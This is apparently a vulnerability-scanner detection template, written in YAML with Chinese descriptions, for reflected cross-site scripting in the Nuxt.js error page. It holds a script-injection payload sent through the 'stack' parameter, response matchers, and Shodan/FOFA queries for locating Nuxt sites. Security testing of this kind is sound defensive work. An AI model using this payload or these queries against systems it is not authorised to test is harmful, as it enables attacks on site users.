id: nuxt-js-xss

info:
  name: Nuxt.js Error Page - 跨站脚本漏洞
  author: DhiyaneshDK
  severity: medium
  description: |
    该模板用于检测 Nuxt.js Error Page - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/__nuxt_error?stack=%0A{{url_encode(payload)}}` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://huntr.dev/bounties/70ac720d-c932-4ed3-98b1-dd2cbcb90185/
    - https://bryces.io/blog/nuxt3
    - https://twitter.com/fofabot/status/1669339995780558849
  classification:
    cwe-id: CWE-80
  metadata:
    verified: true
    max-request: 1
    shodan-query: html:"buildAssetsDir" "nuxt"
    fofa-query: body="buildAssetsDir" && body="__nuxt"
  tags: huntr,xss,nuxtjs,vuln

variables:
  payload: "<script>alert(document.domain)</script>"

http:
  - method: GET
    path:
      - "{{BaseURL}}/__nuxt_error?stack=%0A{{url_encode(payload)}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{payload}}"
          - "window.__NUXT__"
        condition: and

      - type: word
        part: header
        words:
          - "text/html"
